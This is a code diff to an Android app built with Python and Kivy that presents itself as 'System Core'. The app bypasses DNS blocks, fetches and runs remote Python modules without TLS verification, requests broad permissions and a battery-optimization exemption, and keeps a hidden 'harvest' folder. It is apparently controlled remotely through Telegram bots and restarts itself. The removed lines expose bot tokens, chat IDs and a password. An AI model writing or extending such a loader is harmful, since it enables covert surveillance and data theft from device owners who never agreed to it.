@@ -9,6 +9,7 @@ import gc
 import time
 import socket
 import random
+import hashlib
 from datetime import datetime
 from kivy.app import App
 from kivy.uix.textinput import TextInput
@@ -20,12 +21,10 @@ from kivy.core.clipboard import Clipboard
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ========== 1. تجاوز DNS (Patch) ==========
+# ========== 1. تجاوز DNS (Patch) مع عناوين إضافية ==========
 def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
-
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
-        # الأسماء والعناوين البديلة
         override = {
             'raw.githubusercontent.com': [
                 '185.199.108.133', '185.199.109.133',
@@ -43,12 +42,11 @@ def _patch_dns():
             fake_ip = random.choice(override[host])
             return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
         return original_getaddrinfo(host, port, family, type, proto, flags)
-
     socket.getaddrinfo = patched_getaddrinfo
 
 _patch_dns()
 
-# ========== 2. روابط index.json (مرايا متعددة) ==========
+# ========== 2. روابط index.json (مرايا متعددة + Mirror Fallback) ==========
 INDEX_URLS = [
     "https://zaen1993.github.io/Android-Core/index.json",
     "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json",
@@ -79,14 +77,13 @@ R = _get_path()
 U = os.path.join(R, "updates")
 os.makedirs(U, exist_ok=True)
 
-# إنشاء مجلد التخزين المؤقت (مخفي ومُموّه)
 HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
 os.makedirs(HARVEST_QUEUE, exist_ok=True)
 
 if R not in sys.path:
     sys.path.insert(0, R)
 
-# ========== 4. أدن الوصول + طلب استثناء البطارية ==========
+# ========== 4. الأذونات + تجاوز تحسين البطارية ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -110,7 +107,6 @@ def _perms():
     except Exception as e:
         print(f"Permissions error: {e}")
 
-    # طلب تجاوز تحسين البطارية (اختياري)
     try:
         from jnius import autoclass
         PowerManager = autoclass('android.os.PowerManager')
@@ -125,10 +121,10 @@ def _perms():
     except Exception as e:
         print(f"Battery exemption error: {e}")
 
-# ========== 5. كتطبيق Kivy الرئيسي ==========
+# ========== 5. تطبيق Kivy الرئيسي ==========
 class CoreApp(App):
     def build(self):
-        self.title = "System Core v3.0"
+        self.title = "System Core v4.0"
         layout = BoxLayout(orientation='vertical', spacing=5)
 
         self.log = TextInput(
@@ -170,6 +166,7 @@ class CoreApp(App):
         Clock.schedule_once(upd, 0)
 
     def _verify_module(self, file_path, module_name):
+        """التحقق من صحة الملف (عدم فساد أو اختفاء)"""
         if not os.path.exists(file_path):
             return False
         try:
@@ -178,14 +175,13 @@ class CoreApp(App):
             if len(content) < 200:
                 return False
             compile(content, module_name, 'exec')
-            if module_name == "telegram_ui.py" and "class T" not in content:
-                return False
             return True
         except Exception as e:
             self._log(f"Verification error ({module_name}): {e}", "ERROR")
             return False
 
     def _download_safe(self, url, filename):
+        """تحميل ملف مع تجربة مرايا متعددة، وفحص محتوى أساسي"""
         tmp_path = os.path.join(U, filename)
         final_path = os.path.join(R, filename)
 
@@ -206,7 +202,7 @@ class CoreApp(App):
                             if chunk:
                                 content_chunks.append(chunk.decode('utf-8', errors='ignore'))
                                 total_len += len(chunk)
-                                if total_len > 5000000:   # حد 5 ميجابايت
+                                if total_len > 5_000_000:
                                     self._log(f"File too large (>5MB), aborting.", "WARN")
                                     break
                         content = "".join(content_chunks)
@@ -236,15 +232,16 @@ class CoreApp(App):
         _perms()
         self._log("🚀 Ultra Secure Core (Anti-Block Mode) starting...", "BOOT")
 
-        # --- 1. جلب index.json ---
+        # --- 1. جلب index.json (مع مرايا) ---
         all_files = []
+        index_data = None
         for idx_url in INDEX_URLS:
             try:
                 self._log(f"Trying index: {idx_url.split('/')[2]}...")
                 resp = requests.get(idx_url, headers=HEADERS, timeout=15, verify=False)
                 if resp.status_code == 200:
-                    data = resp.json()
-                    all_files = data.get('files', [])
+                    index_data = resp.json()
+                    all_files = index_data.get('files', [])
                     self._log(f"📄 Found {len(all_files)} files from {idx_url.split('/')[2]}")
                     break
                 else:
@@ -261,10 +258,9 @@ class CoreApp(App):
                 continue
             self._download_safe(file_url, filename)
 
-        # --- 3. تأخير بسيط لاستقرار الكتابة ---
-        time.sleep(1)
+        time.sleep(1)   # استقرار القرص
 
-        # --- 4. تنظيف الموديولات القديمة ---
+        # --- 3. تنظيف الموديولات القديمة من الذاكرة ---
         self._log("🧹 Cleaning memory...")
         modules_to_remove = [
             "monitor", "telegram_ui", "commands",
@@ -276,6 +272,17 @@ class CoreApp(App):
                 del sys.modules[mod]
         importlib.invalidate_caches()
         gc.collect()
+
+        # --- 4. تحميل الأسرار من config.py (يتم إنشاؤه أثناء البناء) ---
+        try:
+            import config
+            importlib.reload(config)
+            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = config.load_config()
+            self._log("🔐 Configuration loaded securely.")
+        except Exception as e:
+            self._log(f"❌ Failed to load config: {e}", "ERROR")
+            # لا يمكن الاستمرار بدون أسرار
+            return
 
         # --- 5. التأكد من وجود telegram_ui.py ---
         telegram_path = os.path.join(R, "telegram_ui.py")
@@ -289,6 +296,7 @@ class CoreApp(App):
             import telegram_ui
             import commands
 
+            # إعادة تحميل لضمان أحدث نسخة تم تحميلها
             importlib.reload(monitor)
             importlib.reload(telegram_ui)
             importlib.reload(commands)
@@ -296,35 +304,39 @@ class CoreApp(App):
             UI_Class = getattr(telegram_ui, 'T', None)
             if UI_Class:
                 mon = monitor.M()
-                mon.bots = [
-                    "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
-                    "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4",
-                    "8369506331:AAFbMuU5NsVPWP9y977xG_lLaG1-pdGBs-Q",
-                    "8731591344:AAE2akQtyBPLNZbzhxkjxYDgQ4noiH_keYo",
-                    "8444591624:AAH84_ih3YUm4rEU_0zVnY2H05QTjjyMsZI",
-                    "8541707106:AAHJFi2V57HryzYkmA2FBgFMcetfqQCi2jM"
-                ]
-                mon.ctrl = -1003365166986
-                mon.vlt = -1003787520015
-                mon.pw = "Zaen123@123@"
+                # ربط الجهاز بـ "بوت قائد" ثابت باستخدام random.seed
+                random.seed(mon.did)
+                self._log(f"🆔 Device ID: {mon.did[:8]}... | Cluster seed set")
 
-                ui = UI_Class(mon)
+                # إنشاء واجهة Telegram مع تمرير الأسرار
+                ui = UI_Class(
+                    m=mon,
+                    active_tokens=active_tokens,
+                    reserve_tokens=reserve_tokens,
+                    ctrl_id=ctrl_id,
+                    vault_id=vault_id,
+                    app_password=secret_password
+                )
                 mon.ui = ui
+                # ربط أوامر الـ callback مع commands.ex
                 mon.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, ui, mon, cid, cbq)
 
                 ui.start()
                 mon.start()
                 self._log("🎉 SYSTEM ONLINE (Anti-Block Mode)", "SUCCESS")
                 self._log(f"Device: {mon.did} | Model: {mon.dmd}")
+                self._log(f"Active bots: {len(active_tokens)} | Reserve: {len(reserve_tokens)}")
             else:
                 self._log("❌ Class 'T' missing in telegram_ui.py", "ERROR")
         except Exception as e:
             self._log(f"FATAL ERROR: {e}", "ERROR")
             self._log(traceback.format_exc(), "TRACE")
+            # محاولة إعادة تشغيل الخدمة بعد 60 ثانية في حالة فشل كارثي
+            Clock.schedule_once(lambda dt: self._start(None), 60)
 
-    # ========== تحديات الخدمة (Sticky Service) ==========
+    # ========== دالتا الحفاظ على الخدمة (Sticky Service) ==========
     def on_pause(self):
-        return True   # يمنع إيقاف التطبيق عند الخلفية
+        return True
 
     def on_stop(self):
         self._log("App stopped. Restarting service if needed.")
